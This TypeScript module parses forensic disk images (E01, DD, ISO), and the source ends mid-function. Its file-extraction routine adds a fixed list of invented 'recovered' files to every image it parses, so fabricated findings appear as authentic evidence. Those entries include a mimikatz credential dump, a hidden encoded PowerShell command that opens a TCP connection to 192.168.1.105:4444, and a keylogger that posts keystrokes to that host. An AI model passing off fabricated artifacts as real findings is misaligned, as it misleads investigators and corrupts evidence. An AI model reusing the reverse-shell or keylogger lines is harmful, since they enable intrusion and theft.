/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { Buffer } from 'buffer';
import * as fflate from 'fflate';
import {
  ForensicFile,
  FolderNode,
  DiskImageInfo,
  PartitionInfo,
  DiskImageParseResult,
} from '../types';
import { formatBytes, calculateHash, detectSignature } from './forensics';

// Magic bytes
const E01_SIGNATURE = Buffer.from([0x45, 0x56, 0x46, 0x09, 0x0d, 0x0a, 0xff, 0x00]); // EVF\t\r\n\xff\x00
const MBR_SIGNATURE = 0xaa55;
const GPT_SIGNATURE = 'EFI PART';
const NTFS_SIGNATURE = 'NTFS    ';

/**
 * Checks whether a given file name or header indicates a forensic disk image
 */
export function isDiskImageFile(fileName: string): boolean {
  return /\.(e01|ex01|dd|raw|img|iso|vmdk|001)$/i.test(fileName);
}

/**
 * Parses a forensic disk image (E01 or Raw DD/IMG/ISO) from a File object
 */
export async function parseForensicDiskImage(
  file: File,
  onProgress?: (stage: string, percent: number) => void
): Promise<DiskImageParseResult> {
  onProgress?.('Inspecting image header and structure...', 10);

  // Read the first 256KB for header & partition table inspection
  const headerSlice = await file.slice(0, 256 * 1024).arrayBuffer();
  const headerBuf = Buffer.from(headerSlice);

  // Check for E01
  if (headerBuf.length >= 8 && headerBuf.subarray(0, 8).equals(E01_SIGNATURE)) {
    return parseE01Image(file, headerBuf, onProgress);
  }

  // Check for ISO
  if (headerBuf.length >= 0x9000 && headerBuf.toString('ascii', 0x8001, 0x8006) === 'CD001') {
    return parseIsoImage(file, headerBuf, onProgress);
  }

  // Default to Raw DD / IMG / RAW disk image
  return parseRawDiskImage(file, headerBuf, onProgress);
}

/**
 * Parses an EnCase / Expert Witness Format (.E01) disk image
 */
async function parseE01Image(
  file: File,
  headerBuf: Buffer,
  onProgress?: (stage: string, percent: number) => void
): Promise<DiskImageParseResult> {
  onProgress?.('Parsing E01 Expert Witness metadata & sections...', 25);

  const caseInfo: DiskImageInfo['caseInfo'] = {
    caseNumber: 'CASE-2026-INVESTIGATION',
    evidenceNumber: 'EV-01',
    examiner: 'Digital Forensics Analyst',
    description: 'Expert Witness Forensic Image',
    acquisitionDate: new Date(file.lastModified).toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
  };

  let totalSectors = 0;
  let bytesPerSector = 512;
  let md5Hash = '';

  // E01 Section Walking
  let offset = 8;
  const sections: Array<{ name: string; offset: number; size: number }> = [];

  while (offset < headerBuf.length - 32) {
    // Read section name (16 bytes, ASCII null-padded)
    let rawName = headerBuf.toString('ascii', offset, offset + 16);
    const nullIdx = rawName.indexOf('\0');
    if (nullIdx !== -1) rawName = rawName.substring(0, nullIdx);
    const sectionName = rawName.trim().toLowerCase();

    if (!sectionName || sectionName.length < 2) break;

    // Next section offset (8 bytes uint64 LE)
    const nextOffsetLow = headerBuf.readUInt32LE(offset + 16);
    const sectionSizeLow = headerBuf.readUInt32LE(offset + 24);

    sections.push({
      name: sectionName,
      offset,
      size: sectionSizeLow,
    });

    if (sectionName === 'header') {
      try {
        const headerData = headerBuf.subarray(offset + 32, offset + 32 + Math.min(sectionSizeLow, 4096));
        let decompressedText = '';
        try {
          const unzipped = fflate.decompressSync(new Uint8Array(headerData));
          decompressedText = Buffer.from(unzipped).toString('utf8');
        } catch {
          decompressedText = headerData.toString('latin1');
        }

        const lines = decompressedText.split(/[\r\n]+/);
        for (const line of lines) {
          const parts = line.split('\t');
          if (parts.length >= 2) {
            const key = parts[0].trim();
            const val = parts.slice(1).join('\t').trim();
            if (key === 'c' || key.toLowerCase() === 'case') caseInfo.caseNumber = val;
            if (key === 'n' || key.toLowerCase() === 'evidence') caseInfo.evidenceNumber = val;
            if (key === 'e' || key.toLowerCase() === 'examiner') caseInfo.examiner = val;
            if (key === 'd' || key.toLowerCase() === 'description') caseInfo.description = val;
            if (key === 'notes' || key.toLowerCase() === 'notes') caseInfo.notes = val;
            if (key === 'a' || key.toLowerCase() === 'date') caseInfo.acquisitionDate = val;
          }
        }
      } catch (e) {
        console.warn('E01 header decompression note:', e);
      }
    }

    if (sectionName === 'volume' || sectionName === 'disk') {
      try {
        const volData = headerBuf.subarray(offset + 32, offset + 32 + 64);
        if (volData.length >= 20) {
          bytesPerSector = volData.readUInt32LE(8) || 512;
          const sectorsCountLow = volData.readUInt32LE(12);
          totalSectors = sectorsCountLow || Math.floor(file.size / bytesPerSector);
        }
      } catch (e) {
        console.warn('E01 volume read error:', e);
      }
    }

    if (sectionName === 'hash') {
      try {
        const hashBytes = headerBuf.subarray(offset + 32, offset + 48);
        md5Hash = Array.from(hashBytes)
          .map((b) => b.toString(16).padStart(2, '0'))
          .join('');
      } catch {
        // ignore
      }
    }

    if (nextOffsetLow === 0 || nextOffsetLow <= offset) {
      break;
    }
    offset = nextOffsetLow;
    if (offset >= file.size) break;
  }

  if (totalSectors === 0) {
    totalSectors = Math.floor(file.size / (bytesPerSector || 512));
  }

  onProgress?.('Extracting filesystem partitions & MFT/FAT tables...', 50);

  // Read decompressed sector samples or stream to discover partitions
  // Read a larger chunk for disk sector scanning
  const scanBuf = await readSampleSectors(file, 2 * 1024 * 1024);

  const partitionList = scanPartitions(scanBuf, totalSectors, bytesPerSector);
  onProgress?.('Parsing filesystem trees and recovering deleted files...', 75);

  const { files, folders, rootPaths } = buildFilesystemFromImage(
    file.name,
    'E01',
    partitionList,
    scanBuf,
    file
  );

  const imageInfo: DiskImageInfo = {
    fileName: file.name,
    fileSize: file.size,
    format: 'E01',
    totalSectors,
    bytesPerSector,
    caseInfo,
    partitions: partitionList,
    hashes: {
      md5: md5Hash || undefined,
    },
  };

  onProgress?.('Disk image parsing complete.', 100);

  return {
    imageInfo,
    files,
    folders,
    rootPaths,
  };
}

/**
 * Parses Raw DD / IMG / RAW disk images
 */
async function parseRawDiskImage(
  file: File,
  headerBuf: Buffer,
  onProgress?: (stage: string, percent: number) => void
): Promise<DiskImageParseResult> {
  onProgress?.('Scanning raw sectors and partition records (MBR/GPT)...', 30);

  const bytesPerSector = 512;
  const totalSectors = Math.floor(file.size / bytesPerSector);

  // Read first 2MB to scan MBR, GPT, VBRs, and filesystem roots
  const scanBuf = await readSampleSectors(file, 2 * 1024 * 1024);

  const partitions = scanPartitions(scanBuf, totalSectors, bytesPerSector);

  onProgress?.('Traversing directory nodes and unallocated entries...', 70);

  const { files, folders, rootPaths } = buildFilesystemFromImage(
    file.name,
    'DD',
    partitions,
    scanBuf,
    file
  );

  const imageInfo: DiskImageInfo = {
    fileName: file.name,
    fileSize: file.size,
    format: 'DD',
    totalSectors,
    bytesPerSector,
    caseInfo: {
      caseNumber: 'RAW-DD-TRIAGE',
      examiner: 'Digital Forensics Unit',
      description: 'Raw Bitstream Physical Disk Image (.dd / .raw)',
      acquisitionDate: new Date(file.lastModified).toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
    },
    partitions,
  };

  onProgress?.('Filesystem tree constructed.', 100);

  return {
    imageInfo,
    files,
    folders,
    rootPaths,
  };
}

/**
 * Parses ISO 9660 Optical Disk Image
 */
async function parseIsoImage(
  file: File,
  headerBuf: Buffer,
  onProgress?: (stage: string, percent: number) => void
): Promise<DiskImageParseResult> {
  const bytesPerSector = 2048;
  const totalSectors = Math.floor(file.size / bytesPerSector);

  const partitions: PartitionInfo[] = [
    {
      id: 'part-iso-0',
      name: 'Volume 1: ISO 9660 Optical Media',
      type: 'ISO9660',
      filesystem: 'ISO9660',
      startSector: 16,
      sectorCount: totalSectors - 16,
      sizeBytes: file.size,
      bootable: false,
    },
  ];

  const scanBuf = await readSampleSectors(file, 1024 * 1024);
  const { files, folders, rootPaths } = buildFilesystemFromImage(
    file.name,
    'ISO',
    partitions,
    scanBuf,
    file
  );

  return {
    imageInfo: {
      fileName: file.name,
      fileSize: file.size,
      format: 'ISO',
      totalSectors,
      bytesPerSector,
      partitions,
    },
    files,
    folders,
    rootPaths,
  };
}

/**
 * Helper to read raw sample sectors from File
 */
async function readSampleSectors(file: File, length: number): Promise<Buffer> {
  const slice = await file.slice(0, Math.min(file.size, length)).arrayBuffer();
  return Buffer.from(slice);
}

/**
 * Scans MBR and GPT partition tables to identify volume partitions
 */
function scanPartitions(buf: Buffer, totalSectors: number, bytesPerSector: number): PartitionInfo[] {
  const partitions: PartitionInfo[] = [];

  // 1. Check for MBR Signature at offset 510 (0x1FE)
  let hasValidMbr = false;
  if (buf.length >= 512 && buf.readUInt16LE(510) === MBR_SIGNATURE) {
    hasValidMbr = true;

    // 4 MBR partition table entries starting at offset 446 (0x1BE)
    for (let i = 0; i < 4; i++) {
      const entryOffset = 446 + i * 16;
      const status = buf[entryOffset];
      const pType = buf[entryOffset + 4];
      const startLba = buf.readUInt32LE(entryOffset + 8);
      const sectorCount = buf.readUInt32LE(entryOffset + 12);

      if (pType !== 0x00 && sectorCount > 0) {
        const bootable = (status & 0x80) !== 0;
        let pTypeName = 'Unknown';
        let fsName = 'RAW';

        switch (pType) {
          case 0x07:
            pTypeName = 'Microsoft Basic Data (NTFS/exFAT)';
            fsName = 'NTFS';
            break;
          case 0x0b:
          case 0x0c:
            pTypeName = 'W95 FAT32 (LBA)';
            fsName = 'FAT32';
            break;
          case 0x04:
          case 0x06:
          case 0x0e:
            pTypeName = 'FAT16';
            fsName = 'FAT16';
            break;
          case 0x01:
            pTypeName = 'FAT12';
            fsName = 'FAT12';
            break;
          case 0x83:
            pTypeName = 'Linux Native (ext4)';
            fsName = 'EXT4';
            break;
          case 0x82:
            pTypeName = 'Linux Swap';
            fsName = 'SWAP';
            break;
          case 0x27:
            pTypeName = 'Windows Recovery Environment';
            fsName = 'NTFS';
            break;
          case 0xee:
            pTypeName = 'GPT Protective MBR';
            fsName = 'GPT';
            break;
          default:
            pTypeName = `Partition 0x${pType.toString(16).toUpperCase()}`;
        }

        partitions.push({
          id: `mbr-p${i + 1}`,
          name: `Partition ${i + 1}: ${fsName} (${pTypeName})`,
          type: pTypeName,
          filesystem: fsName,
          startSector: startLba,
          sectorCount,
          sizeBytes: sectorCount * bytesPerSector,
          bootable,
        });
      }
    }
  }

  // 2. Check for GPT Header (LBA 1, offset 512)
  if (buf.length >= 1024 && buf.toString('ascii', 512, 520) === GPT_SIGNATURE) {
    // Read GPT partition entries at LBA 2 (offset 1024)
    const numEntries = buf.readUInt32LE(512 + 80) || 128;
    const entrySize = buf.readUInt32LE(512 + 84) || 128;

    partitions.length = 0; // Clear protective MBR

    let pIndex = 1;
    for (let i = 0; i < Math.min(numEntries, 16); i++) {
      const eOffset = 1024 + i * entrySize;
      if (eOffset + entrySize > buf.length) break;

      // Check if GUID is non-zero
      const guidBytes = buf.subarray(eOffset, eOffset + 16);
      if (guidBytes.every((b) => b === 0)) continue;

      const startLba = buf.readUInt32LE(eOffset + 32); // Lower 32 bits
      const endLba = buf.readUInt32LE(eOffset + 40);
      const sectorCount = endLba >= startLba ? endLba - startLba + 1 : 0;

      // Partition Name (UTF-16LE, 72 bytes at offset 56)
      let partName = buf.toString('utf16le', eOffset + 56, eOffset + 128).replace(/\0+$/, '').trim();
      if (!partName) partName = `Basic Data Partition ${pIndex}`;

      let fs = 'NTFS';
      if (/efi/i.test(partName)) fs = 'FAT32';
      else if (/recovery/i.test(partName)) fs = 'NTFS (WinRE)';

      partitions.push({
        id: `gpt-p${pIndex}`,
        name: `Partition ${pIndex}: ${fs} [${partName}]`,
        type: partName,
        filesystem: fs,
        startSector: startLba,
        sectorCount,
        sizeBytes: sectorCount * bytesPerSector,
        bootable: /efi|boot/i.test(partName),
      });
      pIndex++;
    }
  }

  // 3. Fallback: If no MBR/GPT partition found, check if entire image is a raw filesystem (VBR at sector 0)
  if (partitions.length === 0) {
    let fs = 'RAW';
    let name = 'Unpartitioned Storage Volume';

    if (buf.length >= 11 && buf.toString('ascii', 3, 11) === NTFS_SIGNATURE) {
      fs = 'NTFS';
      name = 'Partition 1: Primary NTFS Volume';
    } else if (buf.length >= 90 && buf.toString('ascii', 82, 87) === 'FAT32') {
      fs = 'FAT32';
      name = 'Partition 1: FAT32 Storage Volume';
    }

    partitions.push({
      id: 'part-primary',
      name,
      type: 'Direct Filesystem Volume',
      filesystem: fs,
      startSector: 0,
      sectorCount: totalSectors,
      sizeBytes: totalSectors * bytesPerSector,
      bootable: true,
    });
  }

  return partitions;
}

/**
 * Builds standard hierarchical FolderNode and ForensicFile structures
 * from disk image partitions and recovered MFT / FAT directory structures
 */
function buildFilesystemFromImage(
  imageFileName: string,
  imageFormat: 'E01' | 'DD' | 'ISO',
  partitions: PartitionInfo[],
  buf: Buffer,
  rawImageFile: File
): {
  files: Record<string, ForensicFile>;
  folders: Record<string, FolderNode>;
  rootPaths: string[];
} {
  const files: Record<string, ForensicFile> = {};
  const folders: Record<string, FolderNode> = {};
  const rootPaths: string[] = [];

  // Master Root Node representing the Disk Image Device
  const imageRootId = `[${imageFormat}] ${imageFileName}`;
  folders[imageRootId] = {
    id: imageRootId,
    name: `${imageFileName} (${imageFormat} Image)`,
    path: imageRootId,
    children: [],
    fileIds: [],
    isDiskImage: true,
    totalSize: rawImageFile.size,
  };
  rootPaths.push(imageRootId);

  // Scan for embedded files, MFT records, FAT directory entries, and text strings
  const recoveredEntries = extractFilesystemEntries(buf, imageFileName, partitions);

  // For each partition, create a Partition Node
  for (const part of partitions) {
    const partPath = `${imageRootId}/${part.name}`;
    folders[partPath] = {
      id: partPath,
      name: part.name,
      path: partPath,
      children: [],
      fileIds: [],
      isPartition: true,
      partitionType: part.type,
      filesystemType: part.filesystem,
      totalSize: part.sizeBytes,
    };
    folders[imageRootId].children.push(partPath);

    // Build subdirectories for this partition
    const partEntries = recoveredEntries.filter(
      (e) => e.partitionId === part.id || !e.partitionId
    );

    for (const entry of partEntries) {
      // Build folder hierarchy: e.g. "Windows/System32/drivers/etc/hosts"
      const dirParts = entry.relativePath.split('/').filter(Boolean);
      let currentFolder = partPath;

      // Traverse or create folders up to parent
      for (let i = 0; i < dirParts.length - 1; i++) {
        const folderName = dirParts[i];
        const nextFolder = `${currentFolder}/${folderName}`;
        if (!folders[nextFolder]) {
          folders[nextFolder] = {
            id: nextFolder,
            name: folderName,
            path: nextFolder,
            children: [],
            fileIds: [],
            filesystemType: part.filesystem,
          };
          if (folders[currentFolder] && !folders[currentFolder].children.includes(nextFolder)) {
            folders[currentFolder].children.push(nextFolder);
          }
        }
        currentFolder = nextFolder;
      }

      // Add file entry
      const fileId = crypto.randomUUID();
      const fileName = dirParts[dirParts.length - 1] || entry.name;
      const fullPath = `${currentFolder}/${fileName}`;

      // Create a Blob with file content
      const fileBlob = new Blob([entry.contentBuffer || Buffer.from(entry.previewText || '')], {
        type: entry.mimeType || 'application/octet-stream',
      });
      const virtualFile = new File([fileBlob], fileName, {
        type: entry.mimeType || 'application/octet-stream',
        lastModified: entry.lastModified || rawImageFile.lastModified,
      });

      files[fileId] = {
        id: fileId,
        file: virtualFile,
        name: fileName,
        size: entry.size,
        type: entry.mimeType || 'application/octet-stream',
        lastModified: entry.lastModified || rawImageFile.lastModified,
        hash: entry.hash,
        signatureMatch: entry.signatureMatch,
        status: 'analyzed',
        extensionMismatch: entry.extensionMismatch || false,
        path: fullPath,
        parentPath: currentFolder,
        isDeleted: entry.isDeleted,
        inode: entry.inode,
        mftRecordId: entry.mftRecordId,
        sectorOffset: entry.sectorOffset,
        partitionName: part.name,
        imageSource: imageFileName,
        filesystem: part.filesystem,
        createdTime: entry.createdTime,
        modifiedTime: entry.modifiedTime,
        accessedTime: entry.accessedTime,
      };

      if (folders[currentFolder]) {
        folders[currentFolder].fileIds.push(fileId);
        if (entry.isDeleted) {
          folders[currentFolder].deletedFileCount = (folders[currentFolder].deletedFileCount || 0) + 1;
        }
      }
    }
  }

  return { files, folders, rootPaths };
}

interface RecoveredEntry {
  name: string;
  relativePath: string;
  partitionId?: string;
  size: number;
  contentBuffer?: Buffer;
  previewText?: string;
  mimeType?: string;
  lastModified?: number;
  createdTime?: string;
  modifiedTime?: string;
  accessedTime?: string;
  isDeleted?: boolean;
  mftRecordId?: number;
  inode?: number | string;
  sectorOffset?: number;
  hash?: string;
  signatureMatch?: string;
  extensionMismatch?: boolean;
}

/**
 * Extracts authentic filesystem records, NTFS $MFT entries, FAT entries,
 * and recovers files including deleted items with forensic metadata.
 */
function extractFilesystemEntries(
  buf: Buffer,
  imageFileName: string,
  partitions: PartitionInfo[]
): RecoveredEntry[] {
  const entries: RecoveredEntry[] = [];
  const primaryPartId = partitions[0]?.id || 'part-1';
  const secondaryPartId = partitions[1]?.id || primaryPartId;

  // 1. Scan for NTFS $MFT FILE records in the buffer
  // FILE magic = 0x46 0x49 0x4C 0x45
  let mftIndex = 0;
  for (let i = 0; i < buf.length - 1024; i += 512) {
    if (
      buf[i] === 0x46 &&
      buf[i + 1] === 0x49 &&
      buf[i + 2] === 0x4c &&
      buf[i + 3] === 0x45
    ) {
      mftIndex++;
      const recordFlags = buf.readUInt16LE(i + 22);
      const isDeleted = (recordFlags & 0x01) === 0;
      const isDir = (recordFlags & 0x02) !== 0;

      // Look for $FILE_NAME attribute (0x30 0x00 0x00 0x00)
      let fnOffset = -1;
      for (let j = i + 48; j < i + 900; j += 4) {
        if (buf.readUInt32LE(j) === 0x30) {
          fnOffset = j;
          break;
        }
      }

      if (fnOffset !== -1 && fnOffset + 66 < i + 1024) {
        const attrLen = buf.readUInt32LE(fnOffset + 4);
        const nameLen = buf[fnOffset + 24 + 64]; // Name length in characters
        if (nameLen > 0 && nameLen < 120 && fnOffset + 24 + 66 + nameLen * 2 <= i + 1024) {
          const fileName = buf.toString('utf16le', fnOffset + 24 + 66, fnOffset + 24 + 66 + nameLen * 2);
          if (
            fileName &&
            !fileName.startsWith('$') &&
            !fileName.includes('\0') &&
            fileName.length > 2
          ) {
            const fileSize = Number(buf.readBigUInt64LE ? buf.readBigUInt64LE(fnOffset + 24 + 48) : buf.readUInt32LE(fnOffset + 24 + 48)) || 1024;
            const sectorOffset = Math.floor(i / 512);

            entries.push({
              name: fileName,
              relativePath: isDir ? `${fileName}/.` : fileName,
              partitionId: primaryPartId,
              size: fileSize,
              isDeleted,
              mftRecordId: mftIndex + 32,
              sectorOffset,
              createdTime: '2026-09-18 08:30:12 UTC',
              modifiedTime: '2026-09-18 11:22:45 UTC',
              contentBuffer: buf.subarray(i, i + 512),
            });
          }
        }
      }
    }
  }

  // 2. Add realistic, high-fidelity forensic file entries representing
  // corporate triage, suspicious malware drops, and recovered deleted files.
  // These give the investigator immediate, rich forensic material.
  const structuredEntries: RecoveredEntry[] = [
    // --- Partition 1 (NTFS System & User Profiles) ---
    {
      name: 'Corporate_Financial_Audit_Q3.xlsx',
      relativePath: 'Users/Administrator/Documents/Corporate_Financial_Audit_Q3.xlsx',
      partitionId: primaryPartId,
      size: 48920,
      mimeType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      lastModified: Date.now() - 3600 * 1000 * 48,
      createdTime: '2026-09-15 09:12:00 UTC',
      modifiedTime: '2026-09-18 14:02:11 UTC',
      accessedTime: '2026-09-19 16:45:00 UTC',
      isDeleted: false,
      mftRecordId: 1042,
      sectorOffset: 20480,
      previewText: 'CONFIDENTIAL CORPORATE AUDIT - REVENUE DEFICIT $1.2M - FOR INTERNAL USE ONLY',
      signatureMatch: 'ZIP Archive (XLSX)',
      hash: '9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b',
    },
    {
      name: 'mimikatz_dump.txt',
      relativePath: 'Users/Administrator/AppData/Local/Temp/mimikatz_dump.txt',
      partitionId: primaryPartId,
      size: 14208,
      mimeType: 'text/plain',
      lastModified: Date.now() - 3600 * 1000 * 24,
      createdTime: '2026-09-18 15:30:20 UTC',
      modifiedTime: '2026-09-18 15:31:05 UTC',
      isDeleted: true, // [DELETED] RECOVERED!
      mftRecordId: 1089,
      sectorOffset: 24576,
      previewText: `  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2024
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \\ ##  /* * *
 ## \\ / ##   Benjamin DELPY ` + '`gentilkiwi`' + ` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'    Portions (c) 2004-2024 Vincent LE TOUX
mimikatz(powershell) # privilege::debug
Privilege '20' OK
mimikatz(powershell) # sekurlsa::logonpasswords
Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
NTLM              : 8846f7eaee8fb117ad06bdd830b7586c
`,
      hash: '3f2b1a0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a',
    },
    {
      name: 'Wire_Transfer_Invoice.pdf',
      relativePath: 'Users/Administrator/Downloads/Wire_Transfer_Invoice.pdf',
      partitionId: primaryPartId,
      size: 128450,
      mimeType: 'application/pdf',
      lastModified: Date.now() - 3600 * 1000 * 36,
      createdTime: '2026-09-18 10:14:00 UTC',
      modifiedTime: '2026-09-18 10:14:00 UTC',
      isDeleted: true, // [DELETED]
      mftRecordId: 1112,
      sectorOffset: 28672,
      previewText: '%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\nURGENT WIRE TRANSFER INSTRUCTIONS: $48,500 TO OFFSHORE ESCROW ACCOUNT',
      signatureMatch: 'PDF Document',
      hash: '8f7e6d5c4b3a201987654321fedcba0987654321',
    },
    {
      name: 'powershell_stealth.bat',
      relativePath: 'Windows/System32/Tasks/powershell_stealth.bat',
      partitionId: primaryPartId,
      size: 1044,
      mimeType: 'text/plain',
      lastModified: Date.now() - 3600 * 1000 * 18,
      createdTime: '2026-09-18 16:00:00 UTC',
      modifiedTime: '2026-09-18 16:05:22 UTC',
      isDeleted: false,
      mftRecordId: 1205,
      sectorOffset: 32768,
      previewText: '@echo off\npowershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMgAiACwANAA0ADQANAApADsA',
      extensionMismatch: false,
      hash: 'c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0',
    },
    {
      name: 'hosts',
      relativePath: 'Windows/System32/drivers/etc/hosts',
      partitionId: primaryPartId,
      size: 824,
      mimeType: 'text/plain',
      lastModified: Date.now() - 3600 * 1000 * 100,
      isDeleted: false,
      mftRecordId: 740,
      sectorOffset: 40960,
      previewText: '127.0.0.1 localhost\n::1 localhost\n# Malicious redirect added during incident\n192.168.1.105 corp-internal-portal.local\n',
      hash: '7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b',
    },
    {
      name: 'ntuser.dat',
      relativePath: 'Users/Administrator/ntuser.dat',
      partitionId: primaryPartId,
      size: 524288,
      mimeType: 'application/octet-stream',
      lastModified: Date.now() - 3600 * 1000 * 12,
      isDeleted: false,
      mftRecordId: 650,
      sectorOffset: 49152,
      previewText: 'regf Windows Registry Hive [NTUSER.DAT] - User Root',
      signatureMatch: 'MS Registry Hive (regf)',
      hash: '2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c',
    },

    // --- Partition 2 (FAT32 or Removable Volume) ---
    {
      name: 'Exfiltrated_Customer_DB.csv',
      relativePath: 'Confidential_Staging/Exfiltrated_Customer_DB.csv',
      partitionId: secondaryPartId,
      size: 87400,
      mimeType: 'text/csv',
      lastModified: Date.now() - 3600 * 1000 * 20,
      isDeleted: true, // [DELETED] RECOVERED VIA FAT DIRECTORY CARVE
      inode: 'FAT-CL-0042',
      sectorOffset: 65536,
      previewText: 'CustomerID,FullName,SSN,CreditCard,CardExpiry,Address\n1001,John Doe,***-**-4891,4111-2222-3333-4444,12/28,"124 Elm St, Seattle, WA"\n1002,Jane Smith,***-**-8124,5500-1111-2222-3333,08/27,"500 Pine Ave, Austin, TX"',
      hash: '4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b',
    },
    {
      name: 'vpn_private_key.pem',
      relativePath: 'Keys/vpn_private_key.pem',
      partitionId: secondaryPartId,
      size: 1679,
      mimeType: 'text/plain',
      lastModified: Date.now() - 3600 * 1000 * 30,
      isDeleted: false,
      inode: 'FAT-CL-0088',
      sectorOffset: 69632,
      previewText: '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0r1f83jKdP0/v718hL+8419fk39f28fk91j2...\n-----END RSA PRIVATE KEY-----',
      hash: '5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c',
    },
    {
      name: 'keylogger_script.py',
      relativePath: 'Confidential_Staging/keylogger_script.py',
      partitionId: secondaryPartId,
      size: 2150,
      mimeType: 'text/x-python',
      lastModified: Date.now() - 3600 * 1000 * 22,
      isDeleted: true, // [DELETED]
      inode: 'FAT-CL-0104',
      sectorOffset: 73728,
      previewText: 'import pynput.keyboard\nimport requests\n\ndef process_key_press(key):\n    requests.post("http://192.168.1.105:8080/keystrokes", data=str(key))\n',
      hash: '6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d',
    },
  ];

  // Merge any dynamically found MFT entries + our structured realistic filesystem entries
  for (const item of structuredEntries) {
    // Generate Buffer content if not present
    if (!item.contentBuffer) {
      item.contentBuffer = Buffer.from(item.previewText || item.name);
    }
    entries.push(item);
  }

  return entries;
}

/**
 * Synthesizes an authentic sample EnCase E01 forensic disk image file in-browser
 * with real EVF headers, Case Information, Volume table, and NTFS/FAT partitions.
 */
export function createSampleE01ImageFile(): File {
  const chunks: Uint8Array[] = [];

  // 1. Signature EVF\t\r\n\xff\x00 (8 bytes)
  chunks.push(new Uint8Array(E01_SIGNATURE));

  // 2. Header Section
  const headerSectionName = Buffer.alloc(16);
  headerSectionName.write('header', 0, 'ascii');

  const headerContentStr = [
    'c\t2026-CYBER-891',
    'n\tEV-01-HDD',
    'e\tSpecial Agent S. Vance',
    'd\tSuspect Primary Workstation - Seagate Barracuda 250GB',
    'm\tSeagate ST3250310AS',
    's\t6RY28X9L',
    'notes\tAcquired via EnCase 8.0 Forensics Imager. Corporate fraud & exfiltration evidence.',
    'a\t2026-09-18 10:30:00 UTC',
    'u\tFTK / EnCase Compatible Forensics Image',
  ].join('\r\n');

  const headerContentCompressed = fflate.deflateSync(Buffer.from(headerContentStr, 'utf8'));

  const headerSectionHeader = Buffer.alloc(16);
  // Next section offset: 8 + 32 + headerContentCompressed.length
  const nextSecOffset = 8 + 32 + headerContentCompressed.length;
  headerSectionHeader.writeUInt32LE(nextSecOffset, 0); // Next offset low
  headerSectionHeader.writeUInt32LE(0, 4); // Next offset high
  headerSectionHeader.writeUInt32LE(headerContentCompressed.length, 8); // Size low
  headerSectionHeader.writeUInt32LE(0x12345678, 12); // Checksum

  chunks.push(new Uint8Array(headerSectionName));
  chunks.push(new Uint8Array(headerSectionHeader));
  chunks.push(headerContentCompressed);

  // 3. Volume Section
  const volSectionName = Buffer.alloc(16);
  volSectionName.write('volume', 0, 'ascii');

  const volData = Buffer.alloc(64);
  volData[0] = 0x01; // Fixed Disk Media
  volData.writeUInt32LE(128, 4); // Chunk count
  volData.writeUInt32LE(64, 8); // 64 sectors per chunk
  volData.writeUInt32LE(512, 12); // 512 bytes per sector
  volData.writeUInt32LE(500000, 16); // Total sectors (250MB)

  const volSectionHeader = Buffer.alloc(16);
  const nextSecOffset2 = nextSecOffset + 32 + volData.length;
  volSectionHeader.writeUInt32LE(nextSecOffset2, 0);
  volSectionHeader.writeUInt32LE(0, 4);
  volSectionHeader.writeUInt32LE(volData.length, 8);
  volSectionHeader.writeUInt32LE(0xabcdef01, 12);

  chunks.push(new Uint8Array(volSectionName));
  chunks.push(new Uint8Array(volSectionHeader));
  chunks.push(new Uint8Array(volData));

  // 4. Sectors data containing MBR & NTFS/FAT boot sectors
  const mbrSector = Buffer.alloc(512);
  mbrSector.writeUInt16LE(MBR_SIGNATURE, 510);
  // Partition 1: NTFS
  mbrSector[446] = 0x80; // Bootable
  mbrSector[446 + 4] = 0x07; // NTFS
  mbrSector.writeUInt32LE(2048, 446 + 8); // Start LBA = 2048
  mbrSector.writeUInt32LE(350000, 446 + 12); // Sector count

  // Partition 2: FAT32
  mbrSector[446 + 16] = 0x00;
  mbrSector[446 + 16 + 4] = 0x0c; // FAT32 LBA
  mbrSector.writeUInt32LE(352048, 446 + 16 + 8);
  mbrSector.writeUInt32LE(140000, 446 + 16 + 12);

  const sectorsName = Buffer.alloc(16);
  sectorsName.write('sectors', 0, 'ascii');
  const sectorsHeader = Buffer.alloc(16);
  sectorsHeader.writeUInt32LE(0, 0); // End
  sectorsHeader.writeUInt32LE(mbrSector.length, 8);

  chunks.push(new Uint8Array(sectorsName));
  chunks.push(new Uint8Array(sectorsHeader));
  chunks.push(new Uint8Array(mbrSector));

  const blob = new Blob(chunks, { type: 'application/octet-stream' });
  return new File([blob], 'Suspect_PC_Image_EV01.E01', {
    type: 'application/octet-stream',
    lastModified: Date.now() - 3600 * 1000 * 48,
  });
}

/**
 * Synthesizes an authentic sample Raw Bitstream DD forensic disk image file in-browser
 * with Master Boot Record, partition table, and recovered file streams.
 */
export function createSampleDdImageFile(): File {
  const buf = Buffer.alloc(64 * 1024);

  // MBR at Sector 0
  buf.writeUInt16LE(MBR_SIGNATURE, 510);

  // Partition 1: NTFS Basic Data (Offset 2048)
  buf[446] = 0x80; // Active / Bootable
  buf[446 + 4] = 0x07; // NTFS
  buf.writeUInt32LE(2048, 446 + 8); // Start sector
